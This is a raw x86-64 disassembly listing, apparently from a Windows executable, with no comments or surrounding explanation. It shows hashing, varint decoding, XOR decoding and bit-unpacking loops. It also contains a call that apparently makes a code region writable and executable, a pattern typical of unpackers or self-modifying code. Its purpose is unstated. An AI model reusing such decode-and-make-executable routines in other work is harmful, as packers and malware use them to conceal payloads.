   14004c75d:	movups XMMWORD PTR [rcx],xmm0
   14004c760:	mov    QWORD PTR [rbp+0x1170],rsi
   14004c767:	mov    QWORD PTR [rbp+0x7d0],rsi
   14004c76e:	mov    rcx,QWORD PTR [rbp+0x1160]
   14004c775:	mov    QWORD PTR [rbp+0x7d8],rcx
   14004c77c:	mov    rax,QWORD PTR [rbp+0x1178]
   14004c783:	mov    QWORD PTR [rbp+0x7e0],rax
   14004c78a:	mov    QWORD PTR [rbp+0x810],r8
   14004c791:	movups XMMWORD PTR [rdx+0x40],xmm7
   14004c795:	mov    QWORD PTR [rbp+0x828],rcx
   14004c79c:	mov    rax,QWORD PTR [rbp+0x608]
   14004c7a3:	mov    QWORD PTR [rbp+0x830],rax
   14004c7aa:	mov    rax,QWORD PTR [rbp+0x6d8]
   14004c7b1:	mov    QWORD PTR [rbp+0x838],rax
   14004c7b8:	mov    rax,QWORD PTR [rbp+0x3f0]
   14004c7bf:	mov    QWORD PTR [rbp+0x840],rax
   14004c7c6:	mov    rax,QWORD PTR [rbp+0xcb0]
   14004c7cd:	movaps XMMWORD PTR [rax+0x10],xmm7
   14004c7d1:	movaps XMMWORD PTR [rax],xmm7
   14004c7d4:	mov    QWORD PTR [rbp+0x890],r13
   14004c7db:	lea    rax,[rbp+0xcc0]
   14004c7e2:	mov    QWORD PTR [rbp+0xf80],rax
   14004c7e9:	lea    rax,[rbp+0xcc8]
   14004c7f0:	mov    QWORD PTR [rbp+0xf88],rax
   14004c7f7:	mov    QWORD PTR [rbp+0xf90],0x8
   14004c802:	and    QWORD PTR [rbp+0xf98],0x0
   14004c80a:	xor    esi,esi
   14004c80c:	lea    rcx,[rbp+0xf80]
   14004c813:	call   0x14003ba96
   14004c818:	test   rdx,rdx
   14004c81b:	je     0x14004c82d
   14004c81d:	movzx  edx,BYTE PTR [rdx]
   14004c820:	shl    eax,0x3
   14004c823:	mov    ecx,eax
   14004c825:	shl    rdx,cl
   14004c828:	or     rsi,rdx
   14004c82b:	jmp    0x14004c80c
   14004c82d:	mov    rax,rsi
   14004c830:	movabs rcx,0x4f1bbcdca8279931
   14004c83a:	imul   rax,rcx
   14004c83e:	rol    rax,0x11
   14004c842:	xor    rax,rsi
   14004c845:	mov    rdx,rax
   14004c848:	movabs rcx,0x6b1f30a8d4c752e9
   14004c852:	xor    rdx,rcx
   14004c855:	movabs rcx,0x1f91b0e3369d229e
   14004c85f:	xor    rax,rcx
   14004c862:	mov    rcx,rdx
   14004c865:	xor    rcx,QWORD PTR [rbp+0x5e8]
   14004c86c:	or     rdx,0x1
   14004c870:	rol    rdx,0x15
   14004c874:	mov    r8,rdx
   14004c877:	push   0x7
   14004c879:	pop    r9
   14004c87b:	sub    r9d,0x1
   14004c87f:	jb     0x14004c8b5
   14004c881:	mov    r10,r8
   14004c884:	xor    r10,rcx
   14004c887:	add    r10,rax
   14004c88a:	rol    r10,0x28
   14004c88e:	add    rcx,r10
   14004c891:	rol    rcx,0xf
   14004c895:	mov    rax,rcx
   14004c898:	shr    rax,0x1d
   14004c89c:	xor    rcx,rax
   14004c89f:	movabs rax,0x79ca1cd2f36bd757
   14004c8a9:	imul   r10,rax
   14004c8ad:	add    r8,rdx
   14004c8b0:	mov    rax,r10
   14004c8b3:	jmp    0x14004c87b
   14004c8b5:	mov    rdx,QWORD PTR [rbp+0x7c8]
   14004c8bc:	mov    rdx,QWORD PTR [rbp+rdx*8+0x1060]
   14004c8c4:	mov    r8,r12
   14004c8c7:	mov    QWORD PTR [rbp+0x1138],rdx
   14004c8ce:	sub    r8,rdx
   14004c8d1:	inc    r8
   14004c8d4:	je     0x14005a1ee
   14004c8da:	xor    rax,rcx
   14004c8dd:	shr    rax,0x20
   14004c8e1:	imul   r12,QWORD PTR [rbp+0x7c8]
   14004c8e9:	xor    edx,edx
   14004c8eb:	div    r8
   14004c8ee:	add    rdx,r12
   14004c8f1:	mov    QWORD PTR [rbp+0x1180],rdx
   14004c8f8:	je     0x14004cf44
   14004c8fe:	mov    eax,0x10000
   14004c903:	mov    rcx,QWORD PTR [rbp+0x1180]
   14004c90a:	cmp    rcx,rax
   14004c90d:	mov    edx,0x10000
   14004c912:	cmovb  rdx,rcx
   14004c916:	lea    rcx,[rbp+0x290]
   14004c91d:	call   0x14003c111
   14004c922:	xor    ebx,ebx
   14004c924:	xor    r12d,r12d
   14004c927:	xor    r14d,r14d
   14004c92a:	xor    edi,edi
   14004c92c:	xor    esi,esi
   14004c92e:	xor    r15d,r15d
   14004c931:	cmp    r15,QWORD PTR [rbp+0x1180]
   14004c938:	jae    0x14004cf31
   14004c93e:	lea    rax,[rsi+0x8]
   14004c942:	cmp    rax,r13
   14004c945:	jbe    0x14004c94e
   14004c947:	xor    edx,edx
   14004c949:	jmp    0x14004cf1d
   14004c94e:	cmp    rdi,0x8
   14004c952:	jae    0x14004ceab
   14004c958:	cmp    rbx,QWORD PTR [rbp+0x828]
   14004c95f:	jae    0x14004c9a7
   14004c961:	mov    rax,QWORD PTR [rbp+0x7d8]
   14004c968:	mov    rcx,QWORD PTR [rbp+0x818]
   14004c96f:	cmp    rcx,rax
   14004c972:	jae    0x14004c9a7
   14004c974:	mov    rdx,QWORD PTR [rbp+0x1170]
   14004c97b:	movzx  r13d,BYTE PTR [rdx+rcx*1]
   14004c980:	and    r13d,0x7f
   14004c984:	inc    rcx
   14004c987:	cmp    rcx,rax
   14004c98a:	jae    0x14004c9b1
   14004c98c:	mov    rdx,QWORD PTR [rbp+0x1170]
   14004c993:	movzx  edx,BYTE PTR [rdx+rcx*1]
   14004c997:	test   dl,dl
   14004c999:	jns    0x14004c9ae
   14004c99b:	shl    r13,0x7
   14004c99f:	and    edx,0x7f
   14004c9a2:	or     r13,rdx
   14004c9a5:	jmp    0x14004c984
   14004c9a7:	xor    edx,edx
   14004c9a9:	jmp    0x14004ce36
   14004c9ae:	mov    rax,rcx
   14004c9b1:	mov    QWORD PTR [rbp+0x818],rax
   14004c9b8:	mov    rax,r13
   14004c9bb:	shr    rax,0x8
   14004c9bf:	mov    rsi,r13
   14004c9c2:	shr    rsi,0x28
   14004c9c6:	movaps XMMWORD PTR [rbp+0x430],xmm7
   14004c9cd:	movaps XMMWORD PTR [rbp+0x420],xmm7
   14004c9d4:	movaps XMMWORD PTR [rbp+0x410],xmm7
   14004c9db:	movaps XMMWORD PTR [rbp+0x400],xmm7
   14004c9e2:	mov    DWORD PTR [rbp+0xf80],eax
   14004c9e8:	lea    rax,[rip+0x3b669]        # 0x140088058
   14004c9ef:	mov    QWORD PTR [rsp+0x20],rax
   14004c9f4:	lea    rcx,[rbp+0x400]
   14004c9fb:	push   0x4
   14004c9fd:	pop    rdx
   14004c9fe:	lea    r8,[rbp+0xf80]
   14004ca05:	mov    r9,rdx
   14004ca08:	call   0x1400638fe
   14004ca0d:	mov    BYTE PTR [rbp+0x404],sil
   14004ca14:	mov    rdi,QWORD PTR [rbp+0x7f0]
   14004ca1b:	cmp    QWORD PTR [rbp+0x838],rdi
   14004ca22:	jbe    0x14004cb4e
   14004ca28:	mov    r9,QWORD PTR [rbp+0x7f8]
   14004ca2f:	cmp    r9,0x4
   14004ca33:	ja     0x140059d9c
   14004ca39:	mov    rcx,QWORD PTR [rbp+0x800]
   14004ca40:	cmp    rcx,0x5
   14004ca44:	jae    0x140059dae
   14004ca4a:	mov    rsi,QWORD PTR [rbp+0x838]
   14004ca51:	cmp    rsi,rdi
   14004ca54:	je     0x140059dbc
   14004ca5a:	mov    r8,rsi
   14004ca5d:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   14004ca64:	mov    cl,BYTE PTR [rbp+0x808]
   14004ca6a:	rol    eax,cl
   14004ca6c:	sub    r8,rdi
   14004ca6f:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   14004ca77:	xor    edx,edx
   14004ca79:	div    r8
   14004ca7c:	mov    rbx,rdx
   14004ca7f:	mov    rax,QWORD PTR [rbp+0x840]
   14004ca86:	mov    QWORD PTR [rbp+0x500],rax
   14004ca8d:	cmp    rdi,0x40
   14004ca91:	push   0x40
   14004ca93:	pop    rax
   14004ca94:	cmovae rdi,rax
   14004ca98:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14004ca9f:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14004caa6:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004caad:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14004cab4:	lea    rcx,[rbp+0xf80]
   14004cabb:	mov    rdx,rdi
   14004cabe:	call   0x14003c0b8
   14004cac3:	test   rsi,rsi
   14004cac6:	je     0x14004cb14
   14004cac8:	mov    rcx,rax
   14004cacb:	mov    r8,rdx
   14004cace:	mov    rax,rdx
   14004cad1:	add    rax,rbx
   14004cad4:	mov    r9,QWORD PTR [rbp+0x830]
   14004cadb:	cmp    rax,rsi
   14004cade:	jbe    0x14004cafe
   14004cae0:	xor    r10d,r10d
   14004cae3:	cmp    r8,r10
   14004cae6:	je     0x14004cb14
   14004cae8:	lea    rax,[r10+rbx*1]
   14004caec:	xor    edx,edx
   14004caee:	div    rsi
   14004caf1:	mov    al,BYTE PTR [r9+rdx*1]
   14004caf5:	mov    BYTE PTR [rcx+r10*1],al
   14004caf9:	inc    r10
   14004cafc:	jmp    0x14004cae3
   14004cafe:	add    r9,rbx
   14004cb01:	xor    eax,eax
   14004cb03:	cmp    r8,rax
   14004cb06:	je     0x14004cb14
   14004cb08:	mov    dl,BYTE PTR [r9+rax*1]
   14004cb0c:	mov    BYTE PTR [rcx+rax*1],dl
   14004cb0f:	inc    rax
   14004cb12:	jmp    0x14004cb03
   14004cb14:	mov    rcx,QWORD PTR [rbp+0x7e8]
   14004cb1b:	xor    eax,eax
   14004cb1d:	cmp    rdi,rax
   14004cb20:	je     0x14004cb4e
   14004cb22:	cmp    rcx,0x3f
   14004cb26:	ja     0x140059d8e
   14004cb2c:	mov    edx,eax
   14004cb2e:	and    edx,0x7
   14004cb31:	mov    dl,BYTE PTR [rbp+rdx*1+0x500]
   14004cb38:	xor    dl,BYTE PTR [rbp+rax*1+0xf80]
   14004cb3f:	inc    rax
   14004cb42:	mov    BYTE PTR [rbp+rcx*1+0x400],dl
   14004cb49:	inc    rcx
   14004cb4c:	jmp    0x14004cb1d
   14004cb4e:	movaps XMMWORD PTR [rbp+0x530],xmm7
   14004cb55:	movaps XMMWORD PTR [rbp+0x520],xmm7
   14004cb5c:	movaps XMMWORD PTR [rbp+0x510],xmm7
   14004cb63:	movaps XMMWORD PTR [rbp+0x500],xmm7
   14004cb6a:	xor    eax,eax
   14004cb6c:	cmp    rax,0x40
   14004cb70:	je     0x14004cb88
   14004cb72:	mov    ecx,DWORD PTR [rbp+rax*1+0x400]
   14004cb79:	bswap  ecx
   14004cb7b:	mov    DWORD PTR [rbp+rax*1+0x500],ecx
   14004cb82:	add    rax,0x4
   14004cb86:	jmp    0x14004cb6c
   14004cb88:	movups xmm0,XMMWORD PTR [rbp+0x848]
   14004cb8f:	mov    eax,DWORD PTR [rbp+0x858]
   14004cb95:	movups XMMWORD PTR [rbp+0xf80],xmm0
   14004cb9c:	mov    DWORD PTR [rbp+0xf90],eax
   14004cba2:	and    DWORD PTR [rbp+0xf94],0x0
   14004cba9:	movaps xmm0,XMMWORD PTR [rbp+0x500]
   14004cbb0:	movaps xmm1,XMMWORD PTR [rbp+0x510]
   14004cbb7:	movaps xmm2,XMMWORD PTR [rbp+0x520]
   14004cbbe:	movaps xmm3,XMMWORD PTR [rbp+0x530]
   14004cbc5:	lea    rax,[rbp+0xf98]
   14004cbcc:	movups XMMWORD PTR [rax+0x30],xmm3
   14004cbd0:	movups XMMWORD PTR [rax+0x20],xmm2
   14004cbd4:	movups XMMWORD PTR [rax+0x10],xmm1
   14004cbd8:	movups XMMWORD PTR [rax],xmm0
   14004cbdb:	call   0x140064214
   14004cbe0:	mov    al,BYTE PTR [rip+0x4bea7]        # 0x140098a8d
   14004cbe6:	cmp    al,0x1
   14004cbe8:	je     0x14004cc31
   14004cbea:	movzx  eax,al
   14004cbed:	cmp    eax,0x2
   14004cbf0:	je     0x14004ccd7
   14004cbf6:	and    DWORD PTR [rbp+0x640],0x0
   14004cbfd:	lea    rcx,[rip+0xfffffffffffb447c]        # 0x140001080
   14004cc04:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004cc0b:	push   0x40
   14004cc0d:	pop    r8
   14004cc0f:	lea    r9,[rbp+0x640]
   14004cc16:	call   QWORD PTR [rip+0x47bec]        # 0x140094808
   14004cc1c:	test   eax,eax
   14004cc1e:	sete   cl
   14004cc21:	inc    cl
   14004cc23:	mov    BYTE PTR [rip+0x4be64],cl        # 0x140098a8d
   14004cc29:	test   eax,eax
   14004cc2b:	je     0x14004ccd7
   14004cc31:	mov    al,BYTE PTR [rip+0x4bf81]        # 0x140098bb8
   14004cc37:	cmp    al,0x1
   14004cc39:	je     0x14004cc5e
   14004cc3b:	movzx  eax,al
   14004cc3e:	test   eax,eax
   14004cc40:	jne    0x14004ccd7
   14004cc46:	call   0x140065d51
   14004cc4b:	test   rax,rax
   14004cc4e:	sete   cl
   14004cc51:	inc    cl
   14004cc53:	mov    BYTE PTR [rip+0x4bf5f],cl        # 0x140098bb8
   14004cc59:	test   rax,rax
   14004cc5c:	je     0x14004ccd7
   14004cc5e:	call   0x140064227
   14004cc63:	mov    eax,0xc8c291de
   14004cc68:	xchg   DWORD PTR [rip+0x4be72],eax        # 0x140098ae0
   14004cc6e:	call   QWORD PTR [rip+0x479dc]        # 0x140094650
   14004cc74:	mov    eax,eax
   14004cc76:	mov    QWORD PTR [rip+0x4b383],rax        # 0x140098000
   14004cc7d:	lea    rcx,[rbp+0xf80]
   14004cc84:	push   0xffffffffffffffff
   14004cc86:	pop    rdx
   14004cc87:	call   0x140010840
   14004cc8c:	xor    eax,eax
   14004cc8e:	xchg   DWORD PTR [rip+0x4be4c],eax        # 0x140098ae0
   14004cc94:	mov    BYTE PTR [rip+0x4bdf3],0x0        # 0x140098a8e
   14004cc9b:	mov    eax,DWORD PTR [rbp+0xf80]
   14004cca1:	add    DWORD PTR [rbp+0x848],eax
   14004cca7:	mov    eax,DWORD PTR [rbp+0xf84]
   14004ccad:	add    DWORD PTR [rbp+0x84c],eax
   14004ccb3:	mov    eax,DWORD PTR [rbp+0xf88]
   14004ccb9:	add    DWORD PTR [rbp+0x850],eax
   14004ccbf:	mov    eax,DWORD PTR [rbp+0xf8c]
   14004ccc5:	add    DWORD PTR [rbp+0x854],eax
   14004cccb:	mov    eax,DWORD PTR [rbp+0xf90]
   14004ccd1:	add    DWORD PTR [rbp+0x858],eax
   14004ccd7:	mov    BYTE PTR [rip+0x4bdae],0x0        # 0x140098a8c
   14004ccde:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14004cce5:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004ccec:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14004ccf3:	xor    eax,eax
   14004ccf5:	cmp    rax,0x14
   14004ccf9:	je     0x14004cd11
   14004ccfb:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   14004cd02:	bswap  ecx
   14004cd04:	mov    DWORD PTR [rbp+rax*1+0xf80],ecx
   14004cd0b:	add    rax,0x4
   14004cd0f:	jmp    0x14004ccf5
   14004cd11:	mov    rax,QWORD PTR [rbp+0x7e0]
   14004cd18:	mov    QWORD PTR [rbp+0x1178],rax
   14004cd1f:	mov    eax,r13d
   14004cd22:	shr    eax,0x3
   14004cd25:	and    eax,0x1f
   14004cd28:	lea    rcx,[rax+rbp*1]
   14004cd2c:	add    rcx,0xf80
   14004cd33:	xor    r8d,r8d
   14004cd36:	xor    edx,edx
   14004cd38:	xor    eax,eax
   14004cd3a:	cmp    r8,0x10
   14004cd3e:	je     0x14004cd59
   14004cd40:	shld   rax,rdx,0x8
   14004cd45:	mov    r9,rdx
   14004cd48:	shl    r9,0x8
   14004cd4c:	movzx  edx,BYTE PTR [rcx+r8*1]
   14004cd51:	inc    r8
   14004cd54:	or     rdx,r9
   14004cd57:	jmp    0x14004cd3a
   14004cd59:	push   0xffffffffffffffff
   14004cd5b:	pop    r8
   14004cd5d:	mov    r9,r8
   14004cd60:	mov    r10,QWORD PTR [rbp+0x1178]
   14004cd67:	mov    ecx,r10d
   14004cd6a:	shl    r9,cl
   14004cd6d:	cmp    r10,0x40
   14004cd71:	not    r9
   14004cd74:	cmovae r9,r8
   14004cd78:	and    r13d,0x7
   14004cd7c:	lea    ecx,[r10+r13*1]
   14004cd80:	neg    cl
   14004cd82:	shrd   rdx,rax,cl
   14004cd86:	shr    rax,cl
   14004cd89:	test   cl,0x40
   14004cd8c:	cmove  rax,rdx
   14004cd90:	and    rax,r9
   14004cd93:	mov    rbx,QWORD PTR [rbp+0x820]
   14004cd9a:	add    r10,0x7
   14004cd9e:	bswap  rax
   14004cda1:	shr    r10,0x3
   14004cda5:	mov    QWORD PTR [rbp+0x500],rax
   14004cdac:	mov    r8,rbx
   14004cdaf:	imul   r8,r10
   14004cdb3:	push   0x8
   14004cdb5:	pop    rcx
   14004cdb6:	sub    rcx,r10
   14004cdb9:	dec    r10
   14004cdbc:	mov    rax,QWORD PTR [rbp+0x1158]
   14004cdc3:	lea    r11,[rax+r8*1]
   14004cdc7:	mov    rax,r8
   14004cdca:	xor    edx,edx
   14004cdcc:	push   0x14
   14004cdce:	pop    rsi
   14004cdcf:	div    rsi
   14004cdd2:	cmp    rcx,0x8
   14004cdd6:	je     0x14004cdfc
   14004cdd8:	cmp    r10,0x7
   14004cddc:	ja     0x140059d80
   14004cde2:	imul   rax,rax,0xffffffffffffffec
   14004cde6:	mov    al,BYTE PTR [r11+rax*1]
   14004cdea:	xor    BYTE PTR [rbp+rcx*1+0x500],al
   14004cdf1:	inc    rcx
   14004cdf4:	inc    r11
   14004cdf7:	inc    r8
   14004cdfa:	jmp    0x14004cdc7
   14004cdfc:	mov    rdx,QWORD PTR [rbp+0x500]
   14004ce03:	bswap  rdx
   14004ce06:	and    rdx,r9
   14004ce09:	inc    rbx
   14004ce0c:	mov    QWORD PTR [rbp+0x820],rbx
   14004ce13:	mov    r13,QWORD PTR [rbp+0x890]
   14004ce1a:	mov    rsi,QWORD PTR [rbp+0x888]
   14004ce21:	mov    rdi,QWORD PTR [rbp+0x880]
   14004ce28:	mov    r12,QWORD PTR [rbp+0x870]
   14004ce2f:	mov    r14,QWORD PTR [rbp+0x878]
   14004ce36:	mov    rax,r13
   14004ce39:	sub    rax,rsi
   14004ce3c:	sub    rax,rdi
   14004ce3f:	mov    r8,QWORD PTR [rbp+0x1178]
   14004ce46:	cmp    rax,r8
   14004ce49:	cmovae rax,r8
   14004ce4d:	cmp    rax,0x1
   14004ce51:	adc    rax,0x0
   14004ce55:	mov    ecx,r8d
   14004ce58:	sub    ecx,eax
   14004ce5a:	and    cl,0x3f
   14004ce5d:	cmp    r8,rax
   14004ce60:	movzx  ecx,cl
   14004ce63:	mov    r8d,0x0
   14004ce69:	cmovbe ecx,r8d
   14004ce6d:	shr    rdx,cl
   14004ce70:	mov    ecx,eax
   14004ce72:	shld   r14,r12,cl
   14004ce76:	shl    r12,cl
   14004ce79:	test   al,0x40
   14004ce7b:	cmovne r14,r12
   14004ce7f:	mov    ecx,0x0
   14004ce84:	cmove  rcx,r12
   14004ce88:	or     rcx,rdx
   14004ce8b:	mov    QWORD PTR [rbp+0x878],r14
   14004ce92:	mov    QWORD PTR [rbp+0x870],rcx
   14004ce99:	add    rdi,rax
   14004ce9c:	mov    QWORD PTR [rbp+0x880],rdi
   14004cea3:	mov    r12,rcx
   14004cea6:	jmp    0x14004c94e
   14004ceab:	add    rdi,0xfffffffffffffff8
   14004ceaf:	mov    rax,r12
   14004ceb2:	mov    ecx,edi
   14004ceb4:	shrd   rax,r14,cl
   14004ceb8:	mov    rdx,r14
   14004cebb:	shr    rdx,cl
   14004cebe:	push   0xffffffffffffffff
   14004cec0:	pop    r9
   14004cec2:	mov    r8,r9
   14004cec5:	shl    r8,cl
   14004cec8:	test   dil,0x40
   14004cecc:	cmove  rdx,rax
   14004ced0:	mov    rax,r9
   14004ced3:	cmovne rax,r8
   14004ced7:	mov    ecx,0x0
   14004cedc:	cmove  rcx,r8
   14004cee0:	mov    QWORD PTR [rbp+0x880],rdi
   14004cee7:	not    rcx
   14004ceea:	not    rax
   14004ceed:	and    rax,r14
   14004cef0:	and    rcx,r12
   14004cef3:	test   rdi,rdi
   14004cef6:	cmove  rcx,rdi
   14004cefa:	cmove  rax,rdi
   14004cefe:	mov    QWORD PTR [rbp+0x878],rax
   14004cf05:	mov    QWORD PTR [rbp+0x870],rcx
   14004cf0c:	add    rsi,0x8
   14004cf10:	mov    QWORD PTR [rbp+0x888],rsi
   14004cf17:	mov    r12,rcx
   14004cf1a:	mov    r14,rax
   14004cf1d:	inc    r15
   14004cf20:	lea    rcx,[rbp+0x290]
   14004cf27:	call   0x14003c141
   14004cf2c:	jmp    0x14004c931
   14004cf31:	mov    rcx,QWORD PTR [rbp+0x290]
   14004cf38:	mov    rdx,QWORD PTR [rbp+0x298]
   14004cf3f:	call   0x14006f7f7
   14004cf44:	mov    ecx,0xc8
   14004cf49:	lea    rdi,[rbp+0x298]
   14004cf50:	lea    rsi,[rbp+0x7d8]
   14004cf57:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   14004cf59:	mov    rax,QWORD PTR [rbp+0x1170]
   14004cf60:	mov    QWORD PTR [rbp+0x290],rax
   14004cf67:	mov    rax,QWORD PTR [rbp+0x200]
   14004cf6e:	mov    QWORD PTR [rbp+0x1178],rax
   14004cf75:	lea    rax,[rbp+0x208]
   14004cf7c:	movups xmm0,XMMWORD PTR [rax]
   14004cf7f:	movups xmm1,XMMWORD PTR [rax+0x10]
   14004cf83:	movaps XMMWORD PTR [rbp+0x710],xmm0
   14004cf8a:	movaps XMMWORD PTR [rbp+0x720],xmm1
   14004cf91:	mov    rax,QWORD PTR [rax+0x20]
   14004cf95:	mov    QWORD PTR [rbp+0x730],rax
   14004cf9c:	mov    edx,0x4000
   14004cfa1:	lea    rcx,[rip+0x32aa8]        # 0x14007fa50
   14004cfa8:	call   0x14003bee8
   14004cfad:	mov    r15,rax
   14004cfb0:	lea    rcx,[rax+0x10]
   14004cfb4:	sub    rdx,0x10
   14004cfb8:	mov    QWORD PTR [rbp+0xca8],rdx
   14004cfbf:	mov    eax,0x0
   14004cfc4:	cmovae rax,rcx
   14004cfc8:	mov    QWORD PTR [rbp+0x1180],rax
   14004cfcf:	jb     0x14005a158
   14004cfd5:	mov    rax,QWORD PTR [rbp+0x1178]
   14004cfdc:	add    rax,0xffffffffffffffbf
   14004cfe0:	cmp    rax,0xffffffffffffffc0
   14004cfe4:	jb     0x14005a158
   14004cfea:	cmp    QWORD PTR [rbp+0xca8],0x0
   14004cff2:	je     0x14005a158
   14004cff8:	mov    rcx,QWORD PTR [rbp+0x1158]
   14004cfff:	lea    rdx,[rbp+0x3b0]
   14004d006:	call   0x14003ad8d
   14004d00b:	lea    rbx,[r15+0x10]
   14004d00f:	mov    rcx,rbx
   14004d012:	mov    rdi,QWORD PTR [rbp+0xca8]
   14004d019:	mov    rdx,rdi
   14004d01c:	call   0x14003adcf
   14004d021:	mov    rsi,QWORD PTR [rbp+0x1178]
   14004d028:	mul    rsi
   14004d02b:	mov    r8,rax
   14004d02e:	push   0xffffffffffffffff
   14004d030:	pop    rax
   14004d031:	cmovo  r8,rax
   14004d035:	mov    rcx,r8
   14004d038:	sub    rcx,0x20
   14004d03c:	mov    eax,0x0
   14004d041:	cmovb  rcx,rax
   14004d045:	mov    QWORD PTR [rbp+0xf68],rcx
   14004d04c:	mov    QWORD PTR [rbp+0x7d0],rbx
   14004d053:	mov    QWORD PTR [rbp+0x7d8],rdi
   14004d05a:	mov    QWORD PTR [rbp+0x7e0],rsi
   14004d061:	lea    rdx,[rbp+0x208]
   14004d068:	movups xmm0,XMMWORD PTR [rdx]
   14004d06b:	movups xmm1,XMMWORD PTR [rdx+0x10]
   14004d06f:	lea    rcx,[rbp+0x7e8]
   14004d076:	movups XMMWORD PTR [rcx],xmm0
   14004d079:	movups XMMWORD PTR [rcx+0x10],xmm1
   14004d07d:	mov    rax,QWORD PTR [rdx+0x20]
   14004d081:	mov    QWORD PTR [rcx+0x20],rax
   14004d085:	lea    rcx,[rbp+0x7d8]
   14004d08c:	and    QWORD PTR [rcx+0x48],0x0
   14004d091:	movaps XMMWORD PTR [rcx+0x38],xmm7
   14004d095:	mov    QWORD PTR [rbp+0x828],rdi
   14004d09c:	mov    rax,QWORD PTR [rbp+0x600]
   14004d0a3:	mov    QWORD PTR [rbp+0x830],rax
   14004d0aa:	mov    rax,QWORD PTR [rbp+0x4f0]
   14004d0b1:	mov    QWORD PTR [rbp+0x838],rax
   14004d0b8:	mov    rax,QWORD PTR [rbp+0x7b8]
   14004d0bf:	mov    QWORD PTR [rbp+0x840],rax
   14004d0c6:	mov    eax,DWORD PTR [rbp+0x3c0]
   14004d0cc:	mov    DWORD PTR [rcx+0x80],eax
   14004d0d2:	movaps xmm0,XMMWORD PTR [rbp+0x3b0]
   14004d0d9:	movups XMMWORD PTR [rcx+0x70],xmm0
   14004d0dd:	mov    rax,QWORD PTR [rbp+0xcb0]
   14004d0e4:	movaps XMMWORD PTR [rax+0x10],xmm7
   14004d0e8:	movaps XMMWORD PTR [rax],xmm7
   14004d0eb:	mov    QWORD PTR [rbp+0x1148],r8
   14004d0f2:	mov    QWORD PTR [rbp+0x890],r8
   14004d0f9:	lea    rcx,[rbp+0x400]
   14004d100:	push   0x4
   14004d102:	pop    rdx
   14004d103:	call   0x14003c111
   14004d108:	xor    ebx,ebx
   14004d10a:	xor    r12d,r12d
   14004d10d:	xor    r14d,r14d
   14004d110:	xor    r13d,r13d
   14004d113:	xor    edi,edi
   14004d115:	mov    QWORD PTR [rbp+0x1160],0x0
   14004d120:	cmp    QWORD PTR [rbp+0x1160],0x4
   14004d128:	je     0x14004d71f
   14004d12e:	lea    rax,[rdi+0x8]
   14004d132:	cmp    rax,QWORD PTR [rbp+0x1148]
   14004d139:	jbe    0x14004d142
   14004d13b:	xor    edx,edx
   14004d13d:	jmp    0x14004d707
   14004d142:	cmp    r13,0x8
   14004d146:	jae    0x14004d694
   14004d14c:	cmp    rbx,QWORD PTR [rbp+0x828]
   14004d153:	jae    0x14004d199
   14004d155:	mov    rax,QWORD PTR [rbp+0x7d8]
   14004d15c:	mov    rcx,QWORD PTR [rbp+0x818]
   14004d163:	cmp    rcx,rax
   14004d166:	jae    0x14004d199
   14004d168:	lea    rdx,[r15+0x10]
   14004d16c:	movzx  r13d,BYTE PTR [rdx+rcx*1]
   14004d171:	and    r13d,0x7f
   14004d175:	lea    rdx,[rcx+0x1]
   14004d179:	cmp    rdx,rax
   14004d17c:	jae    0x14004d1a6
   14004d17e:	movzx  r8d,BYTE PTR [r15+rcx*1+0x11]
   14004d184:	test   r8b,r8b
   14004d187:	jns    0x14004d1a0
   14004d189:	shl    r13,0x7
   14004d18d:	and    r8d,0x7f
   14004d191:	or     r13,r8
   14004d194:	mov    rcx,rdx
   14004d197:	jmp    0x14004d175
   14004d199:	xor    edx,edx
   14004d19b:	jmp    0x14004d623
   14004d1a0:	inc    rcx
   14004d1a3:	mov    rax,rcx
   14004d1a6:	mov    QWORD PTR [rbp+0x818],rax
   14004d1ad:	mov    rax,r13
   14004d1b0:	shr    rax,0x8
   14004d1b4:	mov    rsi,r13
   14004d1b7:	shr    rsi,0x28
   14004d1bb:	movaps XMMWORD PTR [rbp+0x530],xmm7
   14004d1c2:	movaps XMMWORD PTR [rbp+0x520],xmm7
   14004d1c9:	movaps XMMWORD PTR [rbp+0x510],xmm7
   14004d1d0:	movaps XMMWORD PTR [rbp+0x500],xmm7
   14004d1d7:	mov    DWORD PTR [rbp+0x1060],eax
   14004d1dd:	lea    rax,[rip+0x3ae74]        # 0x140088058
   14004d1e4:	mov    QWORD PTR [rsp+0x20],rax
   14004d1e9:	lea    rcx,[rbp+0x500]
   14004d1f0:	push   0x4
   14004d1f2:	pop    rdx
   14004d1f3:	lea    r8,[rbp+0x1060]
   14004d1fa:	mov    r9,rdx
   14004d1fd:	call   0x1400638fe
   14004d202:	mov    BYTE PTR [rbp+0x504],sil
   14004d209:	mov    rsi,QWORD PTR [rbp+0x7f0]
   14004d210:	cmp    QWORD PTR [rbp+0x838],rsi
   14004d217:	jbe    0x14004d343
   14004d21d:	mov    r9,QWORD PTR [rbp+0x7f8]
   14004d224:	cmp    r9,0x4
   14004d228:	ja     0x140059d9c
   14004d22e:	mov    rcx,QWORD PTR [rbp+0x800]
   14004d235:	cmp    rcx,0x5
   14004d239:	jae    0x140059dae
   14004d23f:	mov    rbx,QWORD PTR [rbp+0x838]
   14004d246:	cmp    rbx,rsi
   14004d249:	je     0x140059dbc
   14004d24f:	mov    r8,rbx
   14004d252:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   14004d259:	mov    cl,BYTE PTR [rbp+0x808]
   14004d25f:	rol    eax,cl
   14004d261:	sub    r8,rsi
   14004d264:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   14004d26c:	xor    edx,edx
   14004d26e:	div    r8
   14004d271:	mov    rdi,rdx
   14004d274:	mov    rax,QWORD PTR [rbp+0x840]
   14004d27b:	mov    QWORD PTR [rbp+0xf80],rax
   14004d282:	cmp    rsi,0x40
   14004d286:	push   0x40
   14004d288:	pop    rax
   14004d289:	cmovae rsi,rax
   14004d28d:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14004d294:	movaps XMMWORD PTR [rbp+0x1080],xmm7
